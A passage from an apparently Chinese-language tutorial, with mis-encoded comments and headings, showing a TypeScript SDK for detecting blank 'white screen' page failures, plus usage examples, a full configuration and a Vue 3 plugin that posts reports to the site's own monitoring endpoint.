    <span class="hljs-keyword">const</span> <span class="hljs-attr">weights</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-title class_">DetectionMethod</span>, <span class="hljs-built_in">number</span>&gt; = {
      [<span class="hljs-title class_">DetectionMethod</span>.<span class="hljs-property">SAMPLING</span>]: <span class="hljs-number">3</span>,
      [<span class="hljs-title class_">DetectionMethod</span>.<span class="hljs-property">DOM</span>]: <span class="hljs-number">2</span>,
      [<span class="hljs-title class_">DetectionMethod</span>.<span class="hljs-property">MUTATION</span>]: <span class="hljs-number">2</span>,
      [<span class="hljs-title class_">DetectionMethod</span>.<span class="hljs-property">SCREENSHOT</span>]: <span class="hljs-number">2</span>,
      [<span class="hljs-title class_">DetectionMethod</span>.<span class="hljs-property">SKELETON</span>]: <span class="hljs-number">1</span>,
      [<span class="hljs-title class_">DetectionMethod</span>.<span class="hljs-property">PERFORMANCE</span>]: <span class="hljs-number">1</span>,
      [<span class="hljs-title class_">DetectionMethod</span>.<span class="hljs-property">CUSTOM</span>]: <span class="hljs-number">2</span>,
      [<span class="hljs-title class_">DetectionMethod</span>.<span class="hljs-property">COMBINED</span>]: <span class="hljs-number">1</span>
    };
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> method <span class="hljs-keyword">of</span> usedMethods) {
      <span class="hljs-keyword">const</span> isWhite = methodResults.<span class="hljs-title function_">get</span>(method);
      <span class="hljs-keyword">const</span> weight = weights[method] || <span class="hljs-number">1</span>;
      
      totalVotes += weight;
      <span class="hljs-keyword">if</span> (isWhite) {
        whiteVotes += weight;
      }
    }
    
    <span class="hljs-comment">// è®¡ç®—ç½®ä¿¡åº¦</span>
    <span class="hljs-keyword">const</span> confidence = totalVotes &gt; <span class="hljs-number">0</span> ? <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(whiteVotes - totalVotes / <span class="hljs-number">2</span>) / (totalVotes / <span class="hljs-number">2</span>) : <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦ç™½å±ï¼ˆè¶…è¿‡åŠæ•°åŠ æƒæŠ•ç¥¨ï¼‰</span>
    <span class="hljs-keyword">const</span> isWhiteScreen = whiteVotes &gt; totalVotes / <span class="hljs-number">2</span>;
    
    <span class="hljs-comment">// ç¡®å®šåˆ¤å®šä¾æ®</span>
    <span class="hljs-keyword">let</span> basis = isWhiteScreen ? <span class="hljs-string">'Multiple methods indicate white screen'</span> : <span class="hljs-string">'Page appears normal'</span>;
    
    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰å…³é”®é”™è¯¯</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">errorMonitor</span>.<span class="hljs-title function_">hasCriticalErrors</span>()) {
      basis += <span class="hljs-string">' (Critical JS errors detected)'</span>;
    }
    
    <span class="hljs-keyword">return</span> {
      isWhiteScreen,
      confidence,
      <span class="hljs-attr">methods</span>: usedMethods,
      methodResults,
      basis
    };
  }
  
  <span class="hljs-comment">/**
   * ç”ŸæˆæŠ¥å‘Š
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">generateReport</span>(
    <span class="hljs-attr">result</span>: <span class="hljs-title class_">DetectionResult</span>,
    <span class="hljs-attr">methodResults</span>: <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">DetectionMethod</span>, <span class="hljs-built_in">boolean</span>&gt;
  ): <span class="hljs-title class_">WhiteScreenReport</span> {
    <span class="hljs-keyword">const</span> <span class="hljs-attr">report</span>: <span class="hljs-title class_">WhiteScreenReport</span> = {
      <span class="hljs-attr">isWhiteScreen</span>: result.<span class="hljs-property">isWhiteScreen</span>,
      <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
      <span class="hljs-attr">url</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>,
      <span class="hljs-attr">detectionMethod</span>: result.<span class="hljs-property">methods</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">1</span> ? <span class="hljs-title class_">DetectionMethod</span>.<span class="hljs-property">COMBINED</span> : result.<span class="hljs-property">methods</span>[<span class="hljs-number">0</span>],
      <span class="hljs-attr">userAgent</span>: navigator.<span class="hljs-property">userAgent</span>,
      <span class="hljs-attr">viewport</span>: {
        <span class="hljs-attr">width</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>,
        <span class="hljs-attr">height</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>
      },
      <span class="hljs-attr">devicePixelRatio</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">devicePixelRatio</span>,
      <span class="hljs-attr">networkInfo</span>: <span class="hljs-title function_">getNetworkInfo</span>(),
      <span class="hljs-attr">performanceData</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">performanceDetector</span>.<span class="hljs-title function_">getMetrics</span>()
    };
    
    <span class="hljs-comment">// æ·»åŠ é‡‡æ ·ç»“æœ</span>
    <span class="hljs-keyword">if</span> (methodResults.<span class="hljs-title function_">has</span>(<span class="hljs-title class_">DetectionMethod</span>.<span class="hljs-property">SAMPLING</span>)) {
      report.<span class="hljs-property">samplingResult</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">samplingDetector</span>.<span class="hljs-title function_">detect</span>();
    }
    
    <span class="hljs-comment">// æ·»åŠ  DOM æ£€æµ‹ç»“æœ</span>
    <span class="hljs-keyword">if</span> (methodResults.<span class="hljs-title function_">has</span>(<span class="hljs-title class_">DetectionMethod</span>.<span class="hljs-property">DOM</span>)) {
      report.<span class="hljs-property">domResult</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">domDetector</span>.<span class="hljs-title function_">detect</span>();
    }
    
    <span class="hljs-comment">// æ·»åŠ é”™è¯¯ä¿¡æ¯</span>
    <span class="hljs-keyword">const</span> errors = <span class="hljs-variable language_">this</span>.<span class="hljs-property">errorMonitor</span>.<span class="hljs-title function_">getErrors</span>();
    <span class="hljs-keyword">if</span> (errors.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      report.<span class="hljs-property">errorInfo</span> = errors[<span class="hljs-number">0</span>];
    }
    
    <span class="hljs-keyword">return</span> report;
  }
  
  <span class="hljs-comment">/**
   * æ‰‹åŠ¨è§¦å‘æ£€æµ‹
   */</span>
  <span class="hljs-title function_">manualDetect</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">DetectionResult</span>&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">detect</span>();
  }
  
  <span class="hljs-comment">/**
   * è®¾ç½®ä¸ŠæŠ¥å›è°ƒ
   */</span>
  <span class="hljs-title function_">setReportCallback</span>(<span class="hljs-attr">callback</span>: <span class="hljs-function">(<span class="hljs-params">data: WhiteScreenReport</span>) =&gt;</span> <span class="hljs-built_in">void</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">onReport</span> = callback;
  }
  
  <span class="hljs-comment">/**
   * è®¾ç½®æ£€æµ‹å®Œæˆå›è°ƒ
   */</span>
  <span class="hljs-title function_">setDetectionCompleteCallback</span>(<span class="hljs-attr">callback</span>: <span class="hljs-function">(<span class="hljs-params">result: DetectionResult</span>) =&gt;</span> <span class="hljs-built_in">void</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">onDetectionComplete</span> = callback;
  }
  
  <span class="hljs-comment">/**
   * è·å–æ£€æµ‹ç»Ÿè®¡
   */</span>
  <span class="hljs-title function_">getStats</span>(): {
    <span class="hljs-attr">detectionCount</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">lastDetectionTime</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">errors</span>: <span class="hljs-title class_">ErrorInfo</span>[];
    <span class="hljs-attr">performance</span>: <span class="hljs-title class_">PerformanceData</span>;
  } {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">detectionCount</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">detectionCount</span>,
      <span class="hljs-attr">lastDetectionTime</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">lastDetectionTime</span>,
      <span class="hljs-attr">errors</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">errorMonitor</span>.<span class="hljs-title function_">getErrors</span>(),
      <span class="hljs-attr">performance</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">performanceDetector</span>.<span class="hljs-title function_">getMetrics</span>()
    };
  }
  
  <span class="hljs-comment">/**
   * é”€æ¯ SDK
   */</span>
  <span class="hljs-title function_">destroy</span>(): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">errorMonitor</span>.<span class="hljs-title function_">stop</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">performanceDetector</span>.<span class="hljs-title function_">stop</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">skeletonDetector</span>.<span class="hljs-title function_">stop</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">screenshotDetector</span>.<span class="hljs-title function_">dispose</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isInitialized</span> = <span class="hljs-literal">false</span>;
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'[WhiteScreenSDK] Destroyed'</span>);
  }
}

<span class="hljs-comment">// ==================== å¯¼å‡º ====================</span>

<span class="hljs-comment">// åˆ›å»ºå•ä¾‹</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">sdkInstance</span>: <span class="hljs-title class_">WhiteScreenSDK</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;

<span class="hljs-comment">/**
 * è·å– SDK å®ä¾‹ï¼ˆå•ä¾‹æ¨¡å¼ï¼‰
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getWhiteScreenSDK</span>(<span class="hljs-params">config?: Partial&lt;WhiteScreenConfig&gt;</span>): <span class="hljs-title class_">WhiteScreenSDK</span> {
  <span class="hljs-keyword">if</span> (!sdkInstance) {
    sdkInstance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteScreenSDK</span>(config);
  }
  <span class="hljs-keyword">return</span> sdkInstance;
}

<span class="hljs-comment">/**
 * å¿«é€Ÿåˆå§‹åŒ–å¹¶è¿”å›å®ä¾‹
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">initWhiteScreenDetection</span>(<span class="hljs-params">config?: Partial&lt;WhiteScreenConfig&gt;</span>): <span class="hljs-title class_">WhiteScreenSDK</span> {
  <span class="hljs-keyword">const</span> sdk = <span class="hljs-title function_">getWhiteScreenSDK</span>(config);
  sdk.<span class="hljs-title function_">init</span>();
  <span class="hljs-keyword">return</span> sdk;
}

<span class="hljs-comment">// ES Module å¯¼å‡º</span>
<span class="hljs-keyword">export</span> {
  <span class="hljs-title class_">WhiteScreenSDK</span>,
  <span class="hljs-title class_">WhiteScreenConfig</span>,
  <span class="hljs-title class_">WhiteScreenReport</span>,
  <span class="hljs-title class_">DetectionMethod</span>,
  <span class="hljs-title class_">DetectionResult</span>,
  <span class="hljs-title class_">SamplingDetector</span>,
  <span class="hljs-title class_">DOMDetector</span>,
  <span class="hljs-title class_">MutationDetector</span>,
  <span class="hljs-title class_">ScreenshotDetector</span>,
  <span class="hljs-title class_">SkeletonDetector</span>,
  <span class="hljs-title class_">PerformanceDetector</span>,
  <span class="hljs-title class_">ErrorMonitor</span>,
  <span class="hljs-title class_">Reporter</span>,
  getWhiteScreenSDK,
  initWhiteScreenDetection
};

<span class="hljs-comment">// UMD å¯¼å‡ºï¼ˆå…¼å®¹æµè§ˆå™¨ç›´æ¥ä½¿ç”¨ï¼‰</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">window</span> !== <span class="hljs-string">'undefined'</span>) {
  (<span class="hljs-variable language_">window</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">Window</span> &amp; { <span class="hljs-title class_">WhiteScreenSDK</span>: <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">WhiteScreenSDK</span>; <span class="hljs-attr">initWhiteScreenDetection</span>: <span class="hljs-keyword">typeof</span> initWhiteScreenDetection }).<span class="hljs-property">WhiteScreenSDK</span> = <span class="hljs-title class_">WhiteScreenSDK</span>;
  (<span class="hljs-variable language_">window</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">Window</span> &amp; { <span class="hljs-attr">initWhiteScreenDetection</span>: <span class="hljs-keyword">typeof</span> initWhiteScreenDetection }).<span class="hljs-property">initWhiteScreenDetection</span> = initWhiteScreenDetection;
}
</code></pre>
<h3 data-id="heading-3">ä¸‰ã€ä½¿ç”¨ç¤ºä¾‹</h3>
<h4 data-id="heading-4">1. åŸºç¡€ä½¿ç”¨</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æœ€ç®€å•çš„ä½¿ç”¨æ–¹å¼</span>
<span class="hljs-keyword">import</span> { initWhiteScreenDetection } <span class="hljs-keyword">from</span> <span class="hljs-string">'./white-screen-sdk'</span>;

<span class="hljs-comment">// åˆå§‹åŒ–å¹¶å¼€å§‹æ£€æµ‹</span>
<span class="hljs-keyword">const</span> sdk = <span class="hljs-title function_">initWhiteScreenDetection</span>({
  <span class="hljs-attr">threshold</span>: <span class="hljs-number">0.9</span>,
  <span class="hljs-attr">delay</span>: <span class="hljs-number">2000</span>,
  <span class="hljs-attr">onReport</span>: <span class="hljs-function">(<span class="hljs-params">report</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (report.<span class="hljs-property">isWhiteScreen</span>) {
      <span class="hljs-comment">// å‘é€åˆ°ç›‘æ§å¹³å°</span>
      <span class="hljs-title function_">sendToMonitor</span>(report);
    }
  }
});
</code></pre>
<h4 data-id="heading-5">2. å®Œæ•´é…ç½®ç¤ºä¾‹</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">WhiteScreenSDK</span>, <span class="hljs-title class_">WhiteScreenReport</span>, <span class="hljs-title class_">DetectionResult</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./white-screen-sdk'</span>;

<span class="hljs-comment">// åˆ›å»º SDK å®ä¾‹ï¼Œå®Œæ•´é…ç½®</span>
<span class="hljs-keyword">const</span> sdk = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteScreenSDK</span>({
  <span class="hljs-comment">// é‡‡æ ·é…ç½®</span>
  <span class="hljs-attr">samplingPoints</span>: <span class="hljs-number">20</span>,
  <span class="hljs-attr">threshold</span>: <span class="hljs-number">0.9</span>,
  
  <span class="hljs-comment">// æ—¶é—´é…ç½®</span>
  <span class="hljs-attr">delay</span>: <span class="hljs-number">1500</span>,
  <span class="hljs-attr">timeout</span>: <span class="hljs-number">15000</span>,
  
  <span class="hljs-comment">// åŠŸèƒ½å¼€å…³</span>
  <span class="hljs-attr">enableDOMDetection</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">enableSamplingDetection</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">enableMutationDetection</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">enableScreenshotDetection</span>: <span class="hljs-literal">false</span>,
  <span class="hljs-attr">enableSkeletonDetection</span>: <span class="hljs-literal">true</span>,
  
  <span class="hljs-comment">// é€‰æ‹©å™¨é…ç½®</span>
  <span class="hljs-attr">keyElementSelectors</span>: [
    <span class="hljs-string">'#app'</span>,
    <span class="hljs-string">'#root'</span>,
    <span class="hljs-string">'.main-content'</span>,
    <span class="hljs-string">'[data-page-ready]'</span>
  ],
  <span class="hljs-attr">skeletonSelector</span>: <span class="hljs-string">'.skeleton, .loading-placeholder'</span>,
  <span class="hljs-attr">ignoreSelectors</span>: [
    <span class="hljs-string">'script'</span>,
    <span class="hljs-string">'style'</span>,
    <span class="hljs-string">'.loading-indicator'</span>,
    <span class="hljs-string">'.modal-backdrop'</span>
  ],
  
  <span class="hljs-comment">// é‡è¯•é…ç½®</span>
  <span class="hljs-attr">maxRetries</span>: <span class="hljs-number">3</span>,
  <span class="hljs-attr">retryInterval</span>: <span class="hljs-number">2000</span>,
  
  <span class="hljs-comment">// ç¯å¢ƒé…ç½®</span>
  <span class="hljs-attr">enableInDev</span>: <span class="hljs-literal">false</span>,
  
  <span class="hljs-comment">// å›è°ƒå‡½æ•°</span>
  <span class="hljs-attr">onReport</span>: <span class="hljs-function">(<span class="hljs-params">report: WhiteScreenReport</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ£€æµ‹æŠ¥å‘Š:'</span>, report);
    
    <span class="hljs-keyword">if</span> (report.<span class="hljs-property">isWhiteScreen</span>) {
      <span class="hljs-comment">// ä¸ŠæŠ¥åˆ°ç›‘æ§ç³»ç»Ÿ</span>
      <span class="hljs-title function_">reportToMonitoringSystem</span>(report);
      
      <span class="hljs-comment">// å¯é€‰ï¼šå°è¯•æ¢å¤é¡µé¢</span>
      <span class="hljs-title function_">attemptPageRecovery</span>();
    }
  },
  
  <span class="hljs-attr">onDetectionComplete</span>: <span class="hljs-function">(<span class="hljs-params">result: DetectionResult</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ£€æµ‹å®Œæˆ:'</span>, result);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç½®ä¿¡åº¦:'</span>, result.<span class="hljs-property">confidence</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'åˆ¤å®šä¾æ®:'</span>, result.<span class="hljs-property">basis</span>);
  },
  
  <span class="hljs-comment">// è‡ªå®šä¹‰æ£€æµ‹é€»è¾‘</span>
  <span class="hljs-attr">customDetector</span>: <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// è‡ªå®šä¹‰ç™½å±åˆ¤æ–­é€»è¾‘</span>
    <span class="hljs-keyword">const</span> appElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'app'</span>);
    <span class="hljs-keyword">if</span> (!appElement) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    
    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰å®é™…å†…å®¹</span>
    <span class="hljs-keyword">const</span> hasContent = appElement.<span class="hljs-property">children</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>;
    <span class="hljs-keyword">const</span> hasText = (appElement.<span class="hljs-property">textContent</span>?.<span class="hljs-title function_">trim</span>().<span class="hljs-property">length</span> ?? <span class="hljs-number">0</span>) &gt; <span class="hljs-number">100</span>;
    
    <span class="hljs-keyword">return</span> !hasContent &amp;&amp; !hasText;
  }
});

<span class="hljs-comment">// åˆå§‹åŒ–</span>
sdk.<span class="hljs-title function_">init</span>();

<span class="hljs-comment">// æ‰‹åŠ¨è§¦å‘æ£€æµ‹</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'checkBtn'</span>)?.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> sdk.<span class="hljs-title function_">manualDetect</span>();
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ‰‹åŠ¨æ£€æµ‹ç»“æœ:'</span>, result);
});

<span class="hljs-comment">// ä¸ŠæŠ¥å‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">reportToMonitoringSystem</span>(<span class="hljs-params">report: WhiteScreenReport</span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-comment">// å‘é€åˆ°ç›‘æ§åç«¯</span>
  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/monitor/white-screen'</span>, {
    <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
    <span class="hljs-attr">headers</span>: {
      <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>
    },
    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(report)
  }).<span class="hljs-keyword">catch</span>(<span class="hljs-variable language_">console</span>.<span class="hljs-property">error</span>);
}

<span class="hljs-comment">// é¡µé¢æ¢å¤å°è¯•</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">attemptPageRecovery</span>(<span class="hljs-params"/>): <span class="hljs-built_in">void</span> {
  <span class="hljs-comment">// å°è¯•é‡æ–°åŠ è½½å…³é”®èµ„æº</span>
  <span class="hljs-keyword">const</span> failedScripts = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'script[data-retry]'</span>);
  failedScripts.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">script</span> =&gt;</span> {
    <span class="hljs-keyword">const</span> newScript = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'script'</span>);
    newScript.<span class="hljs-property">src</span> = (script <span class="hljs-keyword">as</span> <span class="hljs-title class_">HTMLScriptElement</span>).<span class="hljs-property">src</span>;
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(newScript);
  });
  
  <span class="hljs-comment">// æˆ–è€…åˆ·æ–°é¡µé¢</span>
  <span class="hljs-comment">// window.location.reload();</span>
}
</code></pre>
<h4 data-id="heading-6">3. Vue 3 é›†æˆç¤ºä¾‹</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// white-screen-plugin.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">App</span>, <span class="hljs-title class_">Plugin</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">WhiteScreenSDK</span>, <span class="hljs-title class_">WhiteScreenConfig</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./white-screen-sdk'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">WhiteScreenPluginOptions</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Partial</span>&lt;<span class="hljs-title class_">WhiteScreenConfig</span>&gt; {
  reportEndpoint?: <span class="hljs-built_in">string</span>;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">WhiteScreenPlugin</span>: <span class="hljs-title class_">Plugin</span> = {
  <span class="hljs-title function_">install</span>(<span class="hljs-params">app: App, options: WhiteScreenPluginOptions = {}</span>) {
    <span class="hljs-comment">// åˆ›å»º SDK å®ä¾‹</span>
    <span class="hljs-keyword">const</span> sdk = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteScreenSDK</span>({
      <span class="hljs-comment">// é»˜è®¤é…ç½®</span>
      <span class="hljs-attr">keyElementSelectors</span>: [<span class="hljs-string">'#app'</span>, <span class="hljs-string">'[data-v-app]'</span>],
      <span class="hljs-attr">enableInDev</span>: <span class="hljs-literal">false</span>,
      
      <span class="hljs-comment">// åˆå¹¶ç”¨æˆ·é…ç½®</span>
      ...options,
      
      <span class="hljs-comment">// è®¾ç½®ä¸ŠæŠ¥å›è°ƒ</span>
      <span class="hljs-attr">onReport</span>: <span class="hljs-function">(<span class="hljs-params">report</span>) =&gt;</span> {
        <span class="hljs-comment">// è°ƒç”¨ç”¨æˆ·æä¾›çš„å›è°ƒ</span>
        options.<span class="hljs-property">onReport</span>?.(report);
        
        <span class="hljs-comment">// å¦‚æœæä¾›äº†ä¸ŠæŠ¥ç«¯ç‚¹ï¼Œè‡ªåŠ¨ä¸ŠæŠ¥</span>
        <span class="hljs-keyword">if</span> (options.<span class="hljs-property">reportEndpoint</span> &amp;&amp; report.<span class="hljs-property">isWhiteScreen</span>) {
          <span class="hljs-title function_">fetch</span>(options.<span class="hljs-property">reportEndpoint</span>, {
            <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
            <span class="hljs-attr">headers</span>: { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span> },
            <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
              ...report,
              <span class="hljs-attr">framework</span>: <span class="hljs-string">'vue'</span>,
              <span class="hljs-attr">version</span>: app.<span class="hljs-property">version</span>
            })
          }).<span class="hljs-keyword">catch</span>(<span class="hljs-variable language_">console</span>.<span class="hljs-property">error</span>);
        }
      }
    });
    
    <span class="hljs-comment">// æ³¨å†Œå…¨å±€å±æ€§</span>
    app.<span class="hljs-property">config</span>.<span class="hljs-property">globalProperties</span>.<span class="hljs-property">$whiteScreen</span> = sdk;
    
    <span class="hljs-comment">// æä¾›ç»™ Composition API ä½¿ç”¨</span>
    app.<span class="hljs-title function_">provide</span>(<span class="hljs-string">'whiteScreenSDK'</span>, sdk);
    
    <span class="hljs-comment">// åœ¨åº”ç”¨æŒ‚è½½ååˆå§‹åŒ–</span>
    <span class="hljs-keyword">const</span> originalMount = app.<span class="hljs-property">mount</span>.<span class="hljs-title function_">bind</span>(app);
    app.<span class="hljs-property">mount</span> = <span class="hljs-function">(<span class="hljs-params">rootContainer</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> vm = <span class="hljs-title function_">originalMount</span>(rootContainer);
      
      <span class="hljs-comment">// å»¶è¿Ÿåˆå§‹åŒ–ï¼Œç­‰å¾… Vue æ¸²æŸ“å®Œæˆ</span>
      <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        sdk.<span class="hljs-title function_">init</span>();
      }, <span class="hljs-number">100</span>);
      
      <span class="hljs-keyword">return</span> vm;
    };
    
    <span class="hljs-comment">// åœ¨åº”ç”¨å¸è½½æ—¶é”€æ¯</span>
    <span class="hljs-keyword">const</span> originalUnmount = app.<span class="hljs-property">unmount</span>.<span class="hljs-title function_">bind</span>(app);
    app.<span class="hljs-property">unmount</span> = <span class="hljs-function">() =&gt;</span> {
      sdk.<span class="hljs-title function_">destroy</span>();
      <span class="hljs-title function_">originalUnmount</span>();
    };
  }
};

<span class="hljs-comment">// ç±»å‹å£°æ˜</span>
<span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">'@vue/runtime-core'</span> {
  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ComponentCustomProperties</span> {
    <span class="hljs-attr">$whiteScreen</span>: <span class="hljs-title class_">WhiteScreenSDK</span>;
  }
}

<span class="hljs-comment">// ç»„åˆå¼ API Hook</span>
<span class="hljs-keyword">import</span> { inject } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useWhiteScreen</span>(<span class="hljs-params"/>): <span class="hljs-title class_">WhiteScreenSDK</span> | <span class="hljs-literal">undefined</span> {
  <span class="hljs-keyword">return</span> inject&lt;<span class="hljs-title class_">WhiteScreenSDK</span>&gt;(<span class="hljs-string">'whiteScreenSDK'</span>);
}
</code></pre>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// main.ts</span>
<span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">WhiteScreenPlugin</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./plugins/white-screen-plugin'</span>;

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>);

app.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">WhiteScreenPlugin</span>, {
  <span class="hljs-attr">threshold</span>: <span class="hljs-number">0.9</span>,
  <span class="hljs-attr">delay</span>: <span class="hljs-number">2000</span>,
  <span class="hljs-attr">reportEndpoint</span>: <span class="hljs-string">'/api/monitor/white-screen'</span>,
  <span class="hljs-attr">enableInDev</span>: <span class="hljs-literal">false</span>,
  <span class="hljs-attr">keyElementSelectors</span>: [<span class="hljs-string">'#app'</span>, <span class="hljs-string">'.main-layout'</span>, <span class="hljs-string">'[data-page-content]'</span>],
  <span class="hljs-attr">onDetectionComplete</span>: <span class="hljs-function">(<span class="hljs-params">result</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (result.<span class="hljs-property">isWhiteScreen</span>) {
      <span class="hljs-comment">// å¯ä»¥åœ¨è¿™é‡Œè§¦å‘é‡è¯•é€»è¾‘æˆ–æ˜¾ç¤ºå‹å¥½æç¤º</span>
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'é¡µé¢å¯èƒ½å‡ºç°ç™½å±ï¼Œæ­£åœ¨å°è¯•æ¢å¤...'</span>);
    }
  }
});

app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>);
</code></pre>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- åœ¨ç»„ä»¶ä¸­ä½¿ç”¨ --&gt;
&lt;template&gt;
  &lt;div class="page"&gt;
    &lt;h1&gt;ç¤ºä¾‹é¡µé¢&lt;/h1&gt;
